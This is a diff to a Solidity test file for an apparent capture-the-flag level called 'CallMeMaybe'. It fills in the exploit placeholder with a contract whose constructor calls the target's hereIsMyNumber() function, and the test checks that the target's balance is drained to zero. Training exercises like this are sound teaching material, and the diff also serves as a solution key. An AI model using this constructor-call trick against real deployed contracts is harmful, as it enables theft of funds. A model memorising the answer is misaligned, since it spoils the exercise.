@@ -15,12 +15,18 @@ contract CallMeMaybeTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        new Exploit(instance);
 
         checkSuccess();
     }
 
     function checkSuccess() internal view override {
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
+    }
+}
+
+contract Exploit {
+    constructor(CallMeMaybe instance) {
+        instance.hereIsMyNumber();
     }
 }
